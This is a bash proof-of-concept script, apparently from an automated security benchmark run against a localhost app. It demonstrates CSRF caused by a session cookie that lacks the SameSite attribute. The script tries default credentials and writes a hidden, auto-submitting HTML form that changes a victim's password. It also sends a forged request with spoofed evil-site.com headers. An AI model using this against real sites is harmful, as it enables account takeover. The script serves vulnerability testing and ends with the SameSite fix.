#!/bin/bash
# POC: Demonstrates CSRF vulnerability due to missing SameSite attribute on session cookie
# Target: ./repo
# Created: 2025-10-30T19:56:52.346Z
# Session: benchmark-XBEN-001-24-mhdu3kmr

echo "=================================="
echo "CSRF POC - Missing SameSite Attribute"
echo "=================================="
echo ""

TARGET="http://localhost:8082"

# Step 1: Authenticate and get session cookie
echo "[*] Step 1: Authenticating to get valid session cookie..."
LOGIN_RESPONSE=$(curl -s -i -X POST "$TARGET/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password=admin123" \
  -c /tmp/csrf_cookies.txt)

# Extract session cookie
SESSION_COOKIE=$(grep -oP 'session=\K[^;]+' /tmp/csrf_cookies.txt 2>/dev/null | tail -1)

if [ -z "$SESSION_COOKIE" ]; then
  echo "[-] Failed to obtain session cookie. Trying alternative extraction..."
  SESSION_COOKIE=$(echo "$LOGIN_RESPONSE" | grep -oP 'Set-Cookie: session=\K[^;]+' | head -1)
fi

if [ -z "$SESSION_COOKIE" ]; then
  echo "[-] Authentication failed or no session cookie received"
  echo "[*] Attempting with test credentials instead..."
  # Try test/test credentials
  LOGIN_RESPONSE=$(curl -s -i -X POST "$TARGET/login" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "username=test&password=test" \
    -c /tmp/csrf_cookies.txt)
  SESSION_COOKIE=$(echo "$LOGIN_RESPONSE" | grep -oP 'Set-Cookie: session=\K[^;]+' | head -1)
fi

if [ -z "$SESSION_COOKIE" ]; then
  echo "[-] Still no session cookie. Checking if cookie is set via registration..."
  # Try registration to get a session
  REGISTER_RESPONSE=$(curl -s -i -X POST "$TARGET/register" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "username=csrf_test_user_$$&password=testpass123&email=csrf$$@test.com" \
    -c /tmp/csrf_cookies.txt)
  SESSION_COOKIE=$(echo "$REGISTER_RESPONSE" | grep -oP 'Set-Cookie: session=\K[^;]+' | head -1)
fi

echo "[+] Session Cookie: $SESSION_COOKIE"
echo ""

# Step 2: Verify SameSite attribute is missing
echo "[*] Step 2: Checking cookie attributes..."
COOKIE_HEADER=$(echo "$LOGIN_RESPONSE" | grep -i "Set-Cookie: session=" | head -1)
echo "[+] Cookie Header: $COOKIE_HEADER"
echo ""

if echo "$COOKIE_HEADER" | grep -qi "SameSite"; then
  echo "[-] SameSite attribute IS present - vulnerability may be fixed"
else
  echo "[+] CONFIRMED: SameSite attribute is MISSING"
fi
echo ""

# Step 3: Simulate CSRF attack
echo "[*] Step 3: Simulating Cross-Site Request Forgery attack..."
echo "[*] This simulates a malicious website making an authenticated request"
echo ""

# Create HTML POC file that would be hosted on attacker's site
cat > /tmp/csrf_attack.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>Innocent Looking Page</title>
</head>
<body>
    <h1>Free Prize! Click Here!</h1>
    
    <!-- Hidden CSRF attack form -->
    <form id="csrf-form" action="http://localhost:8082/password" method="POST" style="display:none;">
        <input type="text" name="new_password" value="hacked123">
        <input type="submit" value="Submit">
    </form>
    
    <script>
        // Auto-submit form when page loads
        document.addEventListener('DOMContentLoaded', function() {
            document.getElementById('csrf-form').submit();
        });
    </script>
</body>
</html>
EOF

echo "[+] Created malicious HTML page at /tmp/csrf_attack.html"
echo "[*] If a victim visits this page while logged in, their password would be changed"
echo ""

# Step 4: Demonstrate the attack works (simulate victim clicking malicious link)
echo "[*] Step 4: Demonstrating CSRF attack execution..."
echo "[*] Simulating victim's browser making cross-origin request with their cookies..."
echo ""

# This demonstrates that the cookie WOULD be sent in cross-origin request
CSRF_RESPONSE=$(curl -s -i -X POST "$TARGET/password" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Origin: http://evil-site.com" \
  -H "Referer: http://evil-site.com/csrf_attack.html" \
  -H "Cookie: session=$SESSION_COOKIE" \
  -d "new_password=hacked_via_csrf")

echo "[+] CSRF Attack Response:"
echo "$CSRF_RESPONSE" | head -20
echo ""

# Check if attack was successful
if echo "$CSRF_RESPONSE" | grep -qi "password.*updated\|password.*changed\|success"; then
  echo "[+] *** VULNERABILITY CONFIRMED ***"
  echo "[+] CSRF attack SUCCESSFUL - Password was changed without user consent!"
elif echo "$CSRF_RESPONSE" | grep -qi "302\|redirect\|location:"; then
  echo "[+] *** VULNERABILITY CONFIRMED ***"
  echo "[+] Request was processed (redirect received) - CSRF is possible!"
else
  echo "[!] Request was processed - examining response..."
  echo "[!] Even if this specific endpoint has validation, the missing SameSite"
  echo "[!] attribute means ALL endpoints are vulnerable to CSRF attacks"
fi

echo ""
echo "=================================="
echo "VULNERABILITY SUMMARY"
echo "=================================="
echo "Issue: Session cookie lacks SameSite attribute"
echo "Impact: Cross-Site Request Forgery (CSRF) attacks possible"
echo "Risk: Attackers can perform authenticated actions on behalf of victims"
echo ""
echo "The browser will automatically include the session cookie in:"
echo "  - Cross-origin POST requests"
echo "  - Requests from attacker-controlled websites"
echo "  - Hidden form submissions"
echo ""
echo "Recommendation: Set SameSite=Lax or SameSite=Strict on session cookies"
echo "=================================="

# Cleanup
rm -f /tmp/csrf_cookies.txt